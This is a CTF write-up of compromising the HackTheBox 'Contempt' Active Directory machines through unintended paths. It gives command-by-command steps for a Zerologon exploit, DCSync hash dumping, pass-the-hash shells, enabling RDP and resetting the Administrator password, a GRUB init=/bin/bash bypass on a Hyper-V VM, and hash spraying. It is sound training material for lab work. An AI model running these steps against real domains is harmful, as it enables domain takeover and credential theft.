---
title: "Contempt & Contempt revenge, how to bypass the fixed machines"
author: "xThaz"
context: "HTB Business 2023"
tags : ["Write-Up", HTB", "AD"]
---

# Contempt - Fullpwn

Contempt was an hard rated Active Directory machine present at the HackTheBox Business CTF 2023. This article aims to write-up how I found two unintended ways that allowed me to get the root flag realy quickly. Thus, in both **contempt** and **contempt - revenge** (supposed to fix the unintended way).

## Contempt

### Recon

#### Ports

As always when we are in front of an HackTheBox machine, we need to enumerate it. To do so, i'll use [rustscan](https://github.com/RustScan/RustScan/) which is just some nmap overlay.
This tool is pretty useful because it first scan for the open ports, then you can ask for the classic nmap options. Which is more optimize than just a basic nmap.

```bash
rustscan -a 10.129.235.160 -- -T4 -sVC -Pn -oN scan/nmap.md
```

![](https://i.imgur.com/pOCKHlS.png)

Here we can see a bunch of ports. But we might have a clear idea of what we have here.
- 53 : DNS
- 88 : Kerberos
- 135 : RPC
- 139 : Netbios
- 445 : SMB
- 389 / 636 / 3268 / 3269 : LDAP(s)

We can be confident by saying that we have to deal with some Windows Active Directory.

[2179](https://www.speedguide.net/port.php?port=2179) ? Never saw this before, what is this ?

![](https://i.imgur.com/4e6ayBq.png)

Alright we might have to deal with some HyperV, let's keep that in mind.

#### FQDN

When attacking active directory, we always need to resolve its fully qualified domain name since this is how some protocols communicates between them.

First thing that we would like to do is to enumerate the domain name, the machine name and if we have access to some features or even some informations.

To do so I ran [enum4linux-ng](https://github.com/cddmp/enum4linux-ng). It allows us to try different credentials such as Anonymous or Guest logins.

```bash
enum4linux-ng -A 10.129.235.160
```

![](https://i.imgur.com/KWg68On.png)

Let's add those FQDNs to our hosts file like so : 

```text
10.129.235.160 dc01 dc01.contempt.htb contempt.htb
```

We can note multiple things from here :
- Computer name : dc01
- Domaine name : contempt.htb
- The domain SID (could be useful for some attack paths)
- OS Version : Windows 2016 10.0

Windows Server 2016 ? 🤔
This is not brand new lmao.

#### Foothold

When I was attacking the machine for the first time, I ran too quickly the scan and the machine was not fully up. So I did not see all the ports above. This is what I tought the attack surface was :

```text
Open 10.129.233.228:53
Open 10.129.233.228:88
Open 10.129.233.228:135
Open 10.129.233.228:139
Open 10.129.233.228:389
Open 10.129.233.228:445
Open 10.129.233.228:464
Open 10.129.233.228:593
Open 10.129.233.228:636
Open 10.129.233.228:2179
Open 10.129.233.228:3268
Open 10.129.233.228:3269
Open 10.129.233.228:9389
```

I did not have HTTPS and WinRM.

As we saw earlier, we cannot log into the machine using default credentials or anonymously. But within an Active Directory environment, we quickly need some usernames and credentials in order to start exploiting it.

So I decided to try some quick wins, since this is some 2016 server. If I am lucky enough it may work and get some interesting access. Here is the very first command that I ran.

```bash
crackmapexec smb dc01.contempt.htb -M zerologon
```

![](https://i.imgur.com/9cIICbW.png)

![](https://i.imgur.com/mwd5eAJ.jpg)

### Root

####  Zerologon (CVE-2020-1472)

Zerologon is a well-known vulnerability that was disclosed in september 2020. It is exploiting the protocol NetLogon. This protocol is a remote session opening based on RPC calls. But it is also allowing a computer to update his domain computer password from a domain controller. Because of a weak cryptographic configuration, we can set all the challenges to `00000000000000000000000000000000` an impersonate the call to change the password of the computer domain account.

This is what we'll do here, we'll empty the password of `DC01$` domain account. The accounts that ends with `$` are the domain machine accounts.

```bash
wget https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py
python3 cve-2020-1472-exploit.py DC01 10.129.235.160
```

So we can now login using `DC01$` just as if we were a classical user and list the shares.

```bash
crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'DC01$' -p '' --shares
```

![](https://i.imgur.com/oxmQSuV.png)


This means that our exploit worked properly. Unfortunately, nothing interesting here. I also tried to see if there is some GPO stored in the `SYSVOL` share that has encrypted password in it.

```bash
crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'DC01$' -p '' -M gpp_password
```

![](https://i.imgur.com/5Aj9OM2.png)

But no passwords.

#### DCSync using empty DC01$

One very useful trick, now that we have the account machine, is that we have the extended privileges `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. Which means that we can use DCSync to retrieve all the data from the domain controller such as : 
- Domain account username & hashes
- Kerberos keys
- Passwords stored using reversible encryption
- LSA secrets

```bash
crackmapexec smb dc01 -u 'DC01$' -p '' --ntds
```

![](https://i.imgur.com/9uVxWQh.png)

We now have all the hashes, we can impersonate anyone we want using pass-the-hash.

![](https://i.imgur.com/mlWbgB9.jpg)


#### Getting a shell

Let's grab the most privileged user : Administrator. Since I didn't saw the WinRM port at the first time, we need to enumerate the SMB shares in order to see if we have access to `C$`.

```bash
crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'Administrator' -H '8845ad387f66869ab9768c8a7b08b36f' -h
```

![](https://i.imgur.com/d5hR7ec.png)

No `C$` here, but no worries. We have the **write** permission on `NETLOGON` ! So we can use for exemple `wmiexec.py` from [impacket](https://github.com/fortra/impacket).

```bash
wmiexec.py 'contempt.htb/Administrator@dc01.contempt.htb' -hashes ':8845ad387f66869ab9768c8a7b08b36f' -dc-ip 10.129.235.160 -share NETLOGON -shell-type powershell
```

![](https://i.imgur.com/M2EQjd5.png)

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

![](https://i.imgur.com/NWBbb4c.png)

Hmmm, this is not quite common. Usualy when playing HackTheBox, you first have the user.txt and then the root.txt once you've finished the box !
Since I cannot locate the user.txt on the machine, I'll ask to the admins.

![](https://i.imgur.com/aheiY42.png)

Not on the Windows filesystem ? 🤔


### User

#### Recon

Since we do not know yet where the user.txt is located, let's do some enumeration once again.

We could use crackmapexec ioxidresolver module to scan the active interfaces of the machines, maybe there is another machine in the internal network.

```bash
crackmapexec smb dc01.contempt.htb -u 'Administrator' -H '8845ad387f66869ab9768c8a7b08b36f' -M ioxidresolver
```

![](https://i.imgur.com/HkqrBjD.png)

Alright it makes sens, we need to find a linux system, but we're on a windows machine. So there can be 2 hypothesis :
- There is another machine only reachable trought the DC
- The linux is virtualized on the Active Directory

Remember the ports discovered at the beggining ? Remember the port 2179 ? We said that there was some HyperV Virtual Machine involved.

When doing the box, I first saw an interesting directory :

![](https://i.imgur.com/03zqbXJ.png)

In this directory we found the nextcloud configuration.

![](https://i.imgur.com/J8FIwTZ.png)

There is a reverse proxy that redirects `nextcloud.contempt.htb` to `172.16.20.1`. If you remember correctly, I did not have the port 443 in my first nmap, so I missed that one. This is that miss, that made me think to use Zerologon, because I did not found a suitable attack surface.

Alright, but how to get into the VM ? We can use the HyperV Manager, but we need to get the GUI.

#### Enable RDP

We'll enable RDP. And open the right port, since we did not see the port 3389 in our nmap results.

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

#### Add your account to Remote Desktop User

Since our user is Enterprise Admin, we can RDP without doing anything. But if we were a normal user or just Domain Admin, we might have to add our user to the `Remote Desktop User` such as :

```powershell
net localgroup "Remote Management Users" echo.rivers /add
```

#### Log into the machine using RDP

But if you try to log into the machine using pass-the-hash it will throw you an error message saying that you cannot log into the machine using blank password.

![](https://i.imgur.com/VHqzUTV.png)

In that case you can do two things :
- Change the policy to accept empty password logins
- Change the user password

The second one is the fastest since I know the command :

```powershell
net user Administrator JaiEnfinFiniMonDonjonDiabl0!
```

Now we can log into the machine using xfreerdp : 

```bash
xfreerdp /v:'dc01' /d:'contempt.htb' /u:'Administrator' /p:'JaiEnfinFiniMonDonjonDiabl0!' +clipboard /dynamic-resolution /cert:ignore
```

#### Get into the HyperV Manager

In order to reach the right panel, we'll do this : 

`Windows -> Server Manager -> Tools -> HyperV Manager`

![](https://i.imgur.com/P0rrUUs.png)

Here we have our nextcloud VM !

![](https://i.imgur.com/b80L878.png)

But it'll ask for some credential in the CLI. So I started struggling a lot. I missclicked on the "Checkpoint" feature that creates a snapshot and made the VM unusable. So I decided to erase the checkpoint and restart the machine. I then saw the Grub loader.

#### Bypass the authentication

I then remembered a [root-me challenge](http://root-me.org/) that I solved a while ago. It is possible to bypass the authentication of a machine if grub is installed and the bootloader is not encrypted. By following [this article](https://memo-linux.com/grub2-contourner-lauthentification-linux-mot-de-passe-utilisateur-ou-root-oublie/).

At the grub startup, press "e" to edit the startup config. Then add `init=/bin/bash` after the first UUID. Save the configuration using `Ctrl + x`.

Continue the boot so you have a root shell.

```bash
cat /root/user.txt
```

![](https://i.imgur.com/WmZRWuD.png)


## Contempt - Revenge

A few hours after, we received a Discord notification saying that `Contempt - Revenge` was released and fixed the unintended way.

![](https://i.imgur.com/9T1knsC.png)

Since I had no idea how to exploit what I've done in a proper maner, I decided to not go on it. But then I took a look at the number of solves...

![number of solves by challenges](https://i.imgur.com/RGND17D.png)

It should not be that hard :)

### Root

Since we already have a lot of informations from the previous machine, once again, if we're lucky enough we can reuse them !

#### Hash spraying

It's time to spray some hashes using crackmapexec.

```bash
crackmapexec smb dc01.contempt.htb -u domain_users.txt -H '6c8f447c25487adc9148b0a90036c6a8'
```

![](https://i.imgur.com/JPaRbtr.png)

Alright so the Administrator hash is not working on any users, let's try other users. For exemple the hash of a domain user that do not have any special rights.

```bash
crackmapexec smb dc01.contempt.htb -u domain_users.txt -H '2f320b121f6ae368a35ba9819e0d2516' --continue-on-success
```

![](https://i.imgur.com/HSavkbB.png)

![](https://i.imgur.com/nubcdPs.jpg)

Since we know from the previous machine that `aria.frost` and `echo.rivers` are domain admins. Let's see if we can get Domain Admin.

![](https://i.imgur.com/UhYMjUh.png)

The **Pwn3d!** means that we are also local admin of the machine. Game over, we can just repeat the previous exploit steps from [getting a shell](#Getting-a-shell).

## To conclude

It is always fun to find an unintended way in a CTF Challenge. But we cannot blame the challenge maker, it is always hard to think about every exploit paths that can be possible.

Even if you make a hot fixe while the CTF is running, you cannot be sure that you've fixed the unintended ways.

Indeed, after the release of the supposed solution, I must admit that I'm glad that there was those fun unintended. Because I took pleasure to do this box in that way 😊
